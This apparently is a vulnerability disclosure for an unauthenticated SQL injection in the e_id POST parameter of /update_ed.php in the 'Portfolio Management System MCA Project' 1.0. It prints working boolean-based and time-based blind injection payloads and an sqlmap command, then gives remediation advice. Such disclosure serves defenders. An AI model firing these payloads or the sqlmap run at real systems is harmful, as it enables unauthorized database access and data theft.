# **Case Study: SQL Injection in Portfolio Management System MCA Project (PHP & MySQL)**

## **Executive Overview**  
A critical SQL Injection vulnerability has been identified in the “Portfolio Management System MCA Project” (version 1.0) under the file `/update_ed.php`. This weakness enables attackers to exploit the application by injecting malicious SQL commands into the “MULTIPART e_id” parameter, potentially leading to full database compromise, unauthorized data manipulation, and severe impacts on business continuity.

---

## **1. Context and Scope**  
**Product Name:** Portfolio Management System MCA Project using PHP and MySQL  
**Vulnerable Endpoint:** `/update_ed.php`  
**Parameter in Question:** `MULTIPART e_id` (POST)  
**Version:** 1.0  
**Authentication Requirement:** None (open to unauthenticated exploitation)  
**Discovery Credit:** naotuo  
**Vendor Reference:**  
- [Homepage](https://1000projects.org/portfolio-management-system-mca-project-using-php-and-mysql.html)  
- [Download](https://1000projects.org/wp-content/uploads/2022/11/Portfolio-MP.7z)

---

## **2. Root Cause and Impact**  
**Root Cause:**  
User input from the `MULTIPART e_id` parameter is consumed directly within SQL statements without adequate validation or sanitization. As a result, an attacker can append or modify SQL syntax to perform unauthorized database operations.

**Potential Impacts:**  
1. **Unauthorized Access to Database:** Attackers can read private tables or sensitive columns.  
2. **Data Leakage and Modification:** Confidential data may be exfiltrated or altered without detection.  
3. **Escalation to System-wide Control:** In certain scenarios, privileged actions (e.g., dropping tables or creating new admin accounts) are feasible.  
4. **Service Disruption:** Database corruption or heavy load queries can lead to application downtime.

---

## **3. Vulnerability Details**  
The vulnerable parameter is `MULTIPART e_id` when the application processes HTTP POST requests in multipart form-data format. Specifically, boolean-based and time-based blind SQL injection techniques were successfully demonstrated.

### Example Payloads

1. **Boolean-Based Blind**  
   ```makefile
   Content-Disposition: form-data; name="e_id"

   14' RLIKE (SELECT (CASE WHEN (3643=3643) THEN 14 ELSE 0x28 END)) AND 'ypFW'='ypFW
   ```
   
2. **Time-Based Blind**  
   ```makefile
   Content-Disposition: form-data; name="e_id"

   14' AND (SELECT 6088 FROM (SELECT(SLEEP(5)))eMOE) AND 'TYdI'='TYdI
   ```

When inserted into the `e_id` field, these payloads allow attackers to test or exploit the SQL injection flaw through timing responses or boolean checks.  

---

## **4. Exploit Scenario**  
An attacker prepares a specially crafted HTTP request containing malicious POST parameters. By adjusting the “e_id” field, the request manipulates the underlying SQL query. Testing tools like **sqlmap** confirm the injection feasibility:

```bash
sqlmap -r file.txt --batch --level=5 --risk=3 --dbms=mysql --random-agent --tamper=space2comment
```

A screenshot of the sqlmap output (below) highlights the discovery of database names, confirming the injection:

<img width="1143" alt="image" src="https://github.com/user-attachments/assets/18627d36-fdc3-489c-a296-69af69fc5a5e" />


---

## **5. Suggested Remediation**  
To mitigate this vulnerability, the following measures are recommended:

1. **Implement Prepared Statements and Parameter Binding**  
   Ensure the “MULTIPART e_id” parameter is always treated as a non-executable string, thereby neutralizing injection attempts.

2. **Enforce Strict Input Validation**  
   Employ server-side checks to confirm that parameter values conform to expected patterns (e.g., numeric only, if applicable).

3. **Reduce Database Privileges**  
   Restrict the DB user’s permissions to only what is strictly necessary. Avoid running the application with admin-level credentials.

4. **Conduct Routine Security Audits**  
   Regularly scan and pen-test the application to uncover any additional vulnerabilities and promptly apply patches.

---

## **Conclusion**  
The SQL Injection vulnerability in `/update_ed.php` underlines how unchecked user input can jeopardize an entire application’s security. By incorporating safer coding practices—especially prepared statements and robust validations—the Portfolio Management System MCA Project can significantly reduce the likelihood of exploitation. Immediate patching is strongly advised to protect both user data and system functionality.
